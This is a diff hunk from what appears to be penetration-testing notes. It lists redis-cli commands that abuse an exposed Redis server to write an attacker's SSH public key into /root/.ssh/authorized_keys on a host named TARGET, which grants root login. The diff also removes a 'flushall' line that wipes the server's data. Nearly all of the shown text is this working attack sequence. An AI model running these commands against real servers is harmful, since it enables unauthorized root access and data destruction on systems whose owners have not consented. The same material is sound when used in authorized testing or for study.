@@ -66,7 +66,6 @@ redis-cli -h TARGET INFO server
 ssh-keygen -t rsa -f redis_rsa
 
 # Write public key to Redis, then dump to authorized_keys:
-redis-cli -h TARGET flushall
 cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key
 redis-cli -h TARGET config set dir /root/.ssh
 redis-cli -h TARGET config set dbfilename authorized_keys
